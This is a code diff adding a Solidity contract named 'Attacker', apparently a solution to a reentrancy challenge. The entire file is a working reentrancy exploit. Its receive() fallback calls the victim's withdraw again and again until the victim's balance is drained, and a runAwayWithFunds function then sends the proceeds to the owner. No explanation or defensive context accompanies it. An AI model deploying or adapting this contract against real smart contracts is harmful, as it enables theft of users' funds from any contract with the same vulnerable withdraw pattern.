@@ -1,0 +1,46 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+interface IReEntrance {
+    function donate(address _to) external payable;
+    function withdraw(uint _amount) external;
+}
+
+contract Attacker {
+    address public owner;
+    IReEntrance victimContract;
+    uint donationValue = 500000000000000;
+
+    constructor(address _victimAddress) {
+        victimContract = IReEntrance(_victimAddress);
+        owner = msg.sender;
+    }
+
+    function balance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    function donate() public payable {
+        require(msg.value == donationValue, "Value should be 500000000000000 Wei");
+        victimContract.donate{value: msg.value}(address(this));
+    }
+
+    function withdraw() public payable {
+        victimContract.withdraw(donationValue);
+    }
+
+    function runAwayWithFunds() public returns (bool) {
+        require(msg.sender == owner, "Not the owner");
+        uint contractBalance = address(this).balance;
+        (bool sent, ) = msg.sender.call{value: contractBalance}("");
+        require(sent, "WithdrawAll failed");
+        return sent;
+    }
+
+    receive() external payable {
+        uint victimBalance = address(victimContract).balance;
+        if (victimBalance >= donationValue) {
+          victimContract.withdraw(donationValue);
+        }
+    }
+}
